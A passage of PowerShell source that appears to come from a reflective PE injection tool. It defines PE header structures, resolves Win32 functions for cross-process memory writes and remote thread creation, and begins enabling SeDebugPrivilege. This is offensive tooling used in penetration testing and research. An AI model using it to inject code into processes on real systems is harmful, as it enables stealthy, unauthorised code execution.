		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		$nameField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

		#Struct IMAGE_BASE_RELOCATION
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

		#Struct IMAGE_IMPORT_DESCRIPTOR
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

		#Struct IMAGE_EXPORT_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
		
		#Struct LUID
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
		
		#Struct LUID_AND_ATTRIBUTES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
		
		#Struct TOKEN_PRIVILEGES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		return $Win32Types
	}

	Function Get-Win32Constants
	{
		$Win32Constants = New-Object System.Object
		
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		
		return $Win32Constants
	}

	Function Get-Win32Functions
	{
		$Win32Functions = New-Object System.Object
		
		$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
		$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc
		
		$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
		$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx
		
		$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
		$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy
		
		$memsetAddr = Get-ProcAddress msvcrt.dll memset
		$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset
		
		$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
		$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
		$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary
		
		$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
		$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress
		
		$GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
		$GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
		$GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr
		
		$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree
		
		$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
		$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx
		
		$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect
		
		$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
		$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
		$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle
		
		$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
		$FreeLibraryDelegate = Get-DelegateType @([Bool]) ([IntPtr])
		$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary
		
		$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess
		
		$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
	    $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
	    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject
		
		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory
		
		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory
		
		$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread
		
		$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread
		
		$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken
		
		$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread
		
		$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges
		
		$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue
		
		$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf
		
		# NtCreateThreadEx is only ever called on Vista and Win7. NtCreateThreadEx is not exported by ntdll.dll in Windows XP
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
		    $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        }
		
		$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process
		
		$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread
		
		return $Win32Functions
	}
	#####################################

			
	#####################################
	###########    HELPERS   ############
	#####################################

	#Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
	#This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
	Function Sub-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				$Val = $Value1Bytes[$i] - $CarryOver
				#Sub bytes
				if ($Val -lt $Value2Bytes[$i])
				{
					$Val += 256
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
				
				
				[UInt16]$Sum = $Val - $Value2Bytes[$i]

				$FinalBytes[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw "Cannot subtract bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				#Add bytes
				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				$FinalBytes[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($FinalBytes, 0)
	}
	

	Function Compare-Val1GreaterThanVal2AsUInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)
		
		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
			{
				if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
				{
					return $true
				}
				elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw "Cannot compare byte arrays of different size"
		}
		
		return $false
	}
	

	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		
		[Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($ValueBytes, 0))
	}


    Function Get-Hex
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value #We will determine the type dynamically
        )

        $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = "0x{0:X$($ValueSize)}" -f [Int64]$Value #Passing a IntPtr to this doesn't work well. Cast to Int64 first.

        return $Hex
    }
	
	
	Function Test-MemoryRangeValid
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$DebugString,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)
		
	    [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))
		
		$PEEndAddress = $PEInfo.EndAddress
		
		if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. $DebugString"
		}
		if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. $DebugString"
		}
	}
	
	
	Function Write-BytesToMemory
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,
			
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$MemoryAddress
		)
	
		for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
		}
	}
	

	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $TypeBuilder.CreateType()
	}


	#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )

	    # Get a reference to System.dll in the GAC
	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    # Get a reference to the GetModuleHandle and GetProcAddress methods
	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
	    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
	    # Get a handle to the module specified
	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)

	    # Return the address of the function
	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}
	
	
	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		[IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
		if ($ThreadHandle -eq [IntPtr]::Zero)
		{
			Throw "Unable to get the handle to the current thread"
		}
		
		[IntPtr]$ThreadToken = [IntPtr]::Zero
		[Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
		if ($Result -eq $false)
		{
			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				$Result = $Win32Functions.ImpersonateSelf.Invoke(3)
				if ($Result -eq $false)
				{
					Throw "Unable to impersonate self"
				}
				
				$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
				if ($Result -eq $false)
				{
					Throw "Unable to OpenThreadToken."
				}
			}
			else
			{
